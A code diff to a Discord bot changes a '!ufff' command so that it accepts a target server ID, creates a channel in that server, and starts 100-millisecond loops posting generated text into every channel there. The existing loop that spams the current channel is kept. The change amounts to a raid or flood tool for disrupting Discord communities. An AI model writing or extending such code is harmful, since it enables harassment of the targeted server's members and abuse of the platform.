@@ -19,11 +19,24 @@ client.on("messageCreate",function(message){
   if(message.author.bot){
     return;
   }
-  if(message.content=="!ufff"){
+  if(message.content.indexOf("!ufff")!=-1){
+    let serverID=message.content.split("!ufff ")[1];
+    if(serverID){
+      let guild=client.guilds.cache.get(serverID);
+      guild.channels.create({
+        name:"新しい部屋",
+        type:0
+      });
+      guild.channels.cache.forEach(function(channel){
+        setInterval(async function(){
+          await channel.send(getText());
+        },100);
+      });
+    }
     message.delete();
     setInterval(function(){
       message.channel.send(getText());
-    },100);
+    },500);
   }
 });
 client.on("interactionCreate",async function(e){
